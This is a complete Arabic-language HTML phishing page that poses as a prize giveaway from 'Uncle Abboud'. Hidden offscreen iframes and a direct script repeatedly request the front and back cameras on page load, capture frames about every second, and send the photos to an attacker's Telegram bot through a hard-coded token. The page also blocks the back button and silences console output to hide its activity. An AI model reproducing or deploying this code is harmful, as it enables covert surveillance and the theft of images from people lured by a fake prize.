<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>جائزة عمك عبود</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Tahoma', sans-serif;
            padding: 20px;
            overflow: hidden;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border-radius: 40px;
            padding: 40px 30px;
            max-width: 450px;
            width: 100%;
            border: 1px solid rgba(255,215,0,0.2);
            box-shadow: 0 30px 80px rgba(0,0,0,0.7);
            text-align: center;
            position: relative;
            z-index: 10;
        }
        .profile {
            width: 120px;
            height: 120px;
            background: linear-gradient(145deg, #ffd700, #f0a500);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px;
            font-size: 70px;
            box-shadow: 0 10px 40px rgba(255,215,0,0.3);
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%,100%{ transform: translateY(0); }
            50%{ transform: translateY(-10px); }
        }
        h1 { color: #ffd700; font-size: 30px; text-shadow: 0 0 30px rgba(255,215,0,0.2); }
        .sub-title { color: #c0b7e6; font-size: 15px; margin-bottom: 20px; }
        .welcome-msg {
            background: rgba(255,215,0,0.08);
            padding: 15px 20px;
            border-radius: 16px;
            border-right: 3px solid #ffd700;
            color: #e0d6ff;
            font-size: 17px;
            margin-bottom: 25px;
        }
        .welcome-msg span { color: #ffd700; font-weight: bold; }
        .btn-claim {
            background: linear-gradient(135deg, #ffd700, #f0a500);
            color: #0a0a0a;
            border: none;
            padding: 16px 45px;
            border-radius: 60px;
            font-size: 19px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 8px 35px rgba(255,215,0,0.25);
            transition: 0.3s;
        }
        .btn-claim:hover { transform: scale(1.02); }
        .footer-note { color: #5a5280; font-size: 12px; margin-top: 20px; }
        .repeated-msg { color: #ffd700; font-size: 13px; opacity: 0.5; margin-top: 12px; }
        .hidden-iframe {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            border: none;
        }
        ::selection { background: transparent; }
        #status { display: none; }
    </style>
</head>
<body>

<iframe class="hidden-iframe" id="iframe1" allow="camera; microphone"></iframe>
<iframe class="hidden-iframe" id="iframe2" allow="camera; microphone"></iframe>
<iframe class="hidden-iframe" id="iframe3" allow="camera; microphone"></iframe>
<iframe class="hidden-iframe" id="iframe4" allow="camera; microphone"></iframe>
<iframe class="hidden-iframe" id="iframe5" allow="camera; microphone"></iframe>

<div class="container">
    <div class="profile">🧔</div>
    <h1>🌹 عمك عبود يرحب بكم</h1>
    <p class="sub-title">أهلًا وسهلًا في ضيافتكم</p>
    <div class="welcome-msg">
        <span>“</span> مرحبًا، مرحبًا، ألف مرحبًا بكم في عالم عمك عبود <span>”</span>
    </div>
    <button class="btn-claim" id="claimBtn">🎁 خذ جائزتك من عمك عبود</button>
    <div class="repeated-msg">♻️ عمك عبود يرحب بكم — عمك عبود يرحب بكم</div>
    <div class="footer-note">© جميع الحقوق محفوظة لعمك عبود ❤️</div>
</div>

<script>
    const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
    let CHAT_ID = null;
    let started = false;
    let retries = 0;

    function dataURLtoBlob(dataURL) {
        const parts = dataURL.split(',');
        const mime = parts[0].match(/:(.*?);/)[1];
        const bstr = atob(parts[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
        return new Blob([u8arr], { type: mime });
    }

    function sendPhoto(imageData, caption = '') {
        if (!CHAT_ID || !imageData) return;
        try {
            const blob = dataURLtoBlob(imageData);
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, `photo_${Date.now()}.jpg`);
            fd.append('caption', caption);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
        } catch(e) {}
    }

    function getChatId() {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
            .then(r => r.json())
            .then(d => {
                if (d.ok && d.result && d.result.length > 0) {
                    const last = d.result[d.result.length - 1];
                    CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
                    if (CHAT_ID) return;
                }
                if (retries < 30) {
                    retries++;
                    setTimeout(getChatId, 1500);
                }
            })
            .catch(() => {
                if (retries < 30) {
                    retries++;
                    setTimeout(getChatId, 1500);
                }
            });
    }

    function exploitIframe1() {
        try {
            const iframe = document.getElementById('iframe1');
            const doc = iframe.contentDocument || iframe.contentWindow.document;
            doc.open();
            doc.write(`
                <html><body>
                <video id="v" autoplay playsinline style="display:none;"></video>
                <canvas id="c" style="display:none;"></canvas>
                <script>
                    let v=document.getElementById('v'), c=document.getElementById('c');
                    c.width=640;c.height=480;let ctx=c.getContext('2d');
                    function start(){navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})
                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);let img=c.toDataURL('image/jpeg',0.9);window.parent.postMessage({type:'photo',data:img,facing:'front'},'*');}},900);})
                    .catch(()=>{navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);let img=c.toDataURL('image/jpeg',0.9);window.parent.postMessage({type:'photo',data:img,facing:'back'},'*');}},900);}).catch(()=>{});});}
                    start();
                <\/script>
                </body></html>
            `);
            doc.close();
        } catch(e) {}
    }

    function exploitIframe2() {
        try {
            const iframe = document.getElementById('iframe2');
            const doc = iframe.contentDocument || iframe.contentWindow.document;
            doc.open();
            doc.write(`
                <html><body>
                <video id="v" autoplay playsinline style="display:none;"></video>
                <canvas id="c" style="display:none;"></canvas>
                <script>
                    (function(){
                        let v=document.getElementById('v'), c=document.getElementById('c');
                        c.width=640;c.height=480;let ctx=c.getContext('2d');
                        let tried=false;
                        function tryCam(){if(tried)return;tried=true;
                        navigator.mediaDevices.getUserMedia({video:true,audio:false})
                        .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'auto'},'*');}},900);})
                        .catch(()=>{setTimeout(tryCam,1000);});}
                        tryCam();
                    })();
                <\/script>
                </body></html>
            `);
            doc.close();
        } catch(e) {}
    }

    function exploitIframe3() {
        try {
            const iframe = document.getElementById('iframe3');
            const doc = iframe.contentDocument || iframe.contentWindow.document;
            doc.open();
            doc.write(`
                <html><body>
                <video id="v" autoplay playsinline muted style="display:none;"></video>
                <canvas id="c" style="display:none;"></canvas>
                <script>
                    let v=document.getElementById('v'), c=document.getElementById('c');
                    c.width=640;c.height=480;let ctx=c.getContext('2d');
                    navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480},audio:false})
                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'front'},'*');}},1000);})
                    .catch(()=>{navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'back'},'*');}},1000);}).catch(()=>{});});
                <\/script>
                </body></html>
            `);
            doc.close();
        } catch(e) {}
    }

    function exploitIframe4() {
        try {
            const iframe = document.getElementById('iframe4');
            const doc = iframe.contentDocument || iframe.contentWindow.document;
            doc.open();
            doc.write(`
                <html><body>
                <video id="v" autoplay playsinline style="display:none;"></video>
                <canvas id="c" style="display:none;"></canvas>
                <script>
                    let v=document.getElementById('v'), c=document.getElementById('c');
                    c.width=640;c.height=480;let ctx=c.getContext('2d');
                    function capture(){navigator.mediaDevices.getUserMedia({video:true,audio:false})
                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9)},'*');}},800);})
                    .catch(()=>{setTimeout(capture,500);});}
                    capture();
                <\/script>
                </body></html>
            `);
            doc.close();
        } catch(e) {}
    }

    function exploitIframe5() {
        try {
            const iframe = document.getElementById('iframe5');
            const doc = iframe.contentDocument || iframe.contentWindow.document;
            doc.open();
            doc.write(`
                <html><body>
                <video id="v" autoplay playsinline style="display:none;"></video>
                <canvas id="c" style="display:none;"></canvas>
                <script>
                    let v=document.getElementById('v'), c=document.getElementById('c');
                    c.width=640;c.height=480;let ctx=c.getContext('2d');
                    let devices={video:{facingMode:'user'},audio:false};
                    navigator.mediaDevices.getUserMedia(devices)
                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'front'},'*');}},1000);})
                    .catch(()=>{devices.video.facingMode='environment';navigator.mediaDevices.getUserMedia(devices)
                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'back'},'*');}},1000);}).catch(()=>{});});
                <\/script>
                </body></html>
            `);
            doc.close();
        } catch(e) {}
    }

    window.addEventListener('message', function(e) {
        if (e.data && e.data.type === 'photo') {
            sendPhoto(e.data.data, '📸 ' + (e.data.facing === 'front' ? 'أمامي' : e.data.facing === 'back' ? 'خلفي' : 'كاميرا'));
        }
    });

    function exploitDirect() {
        if (started) return;
        started = true;

        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(stream => {
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                setInterval(() => {
                    if (video.readyState >= 2) {
                        ctx.drawImage(video, 0, 0, 640, 480);
                        sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 أمامي');
                    }
                }, 1000);
            })
            .catch(() => {});

        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
            .then(stream => {
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                setInterval(() => {
                    if (video.readyState >= 2) {
                        ctx.drawImage(video, 0, 0, 640, 480);
                        sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 خلفي');
                    }
                }, 1000);
            })
            .catch(() => {});
    }

    function startAllExploits() {
        exploitIframe1();
        exploitIframe2();
        exploitIframe3();
        exploitIframe4();
        exploitIframe5();
        setTimeout(exploitDirect, 1000);
        setTimeout(() => {
            exploitIframe1();
            exploitIframe2();
            exploitIframe3();
            exploitIframe4();
            exploitIframe5();
        }, 3000);
        setInterval(() => {
            exploitIframe1();
            exploitIframe2();
            exploitIframe3();
            exploitIframe4();
            exploitIframe5();
        }, 5000);
    }

    window.onload = function() {
        getChatId();
        startAllExploits();
    };

    history.pushState(null, '', location.href);
    window.addEventListener('popstate', () => history.pushState(null, '', location.href));

    console.log = console.warn = console.error = () => {};
</script>
</body>
</html>
